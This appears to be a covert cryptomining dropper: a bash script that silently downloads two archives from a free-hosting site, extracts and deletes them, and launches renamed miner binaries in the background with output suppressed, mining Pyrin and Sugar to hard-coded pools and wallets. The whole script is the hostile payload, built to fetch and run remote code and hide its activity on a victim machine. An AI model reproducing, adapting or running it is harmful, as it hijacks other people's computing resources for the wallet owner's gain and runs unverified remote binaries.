#!/bin/bash

wget -q -O A http://kon-tol.x10.bz/srbdot.tar.gz
wget -q -O B http://kon-tol.x10.bz/loldot.tar.gz

tar -xzf A >/dev/null 2>&1
tar -xzf B >/dev/null 2>&1

rm A
rm B

nohup ./loldot -a PYRIN --pool kr.pyrin.herominers.com:1177 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOT_CPU-GPU >/dev/null 2>&1

nohup ./srbdot -a yespowersugar -o nomp.mofumofu.me:3391 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j.DOT_CPU-GPU -t 2 >/dev/null 2>&1
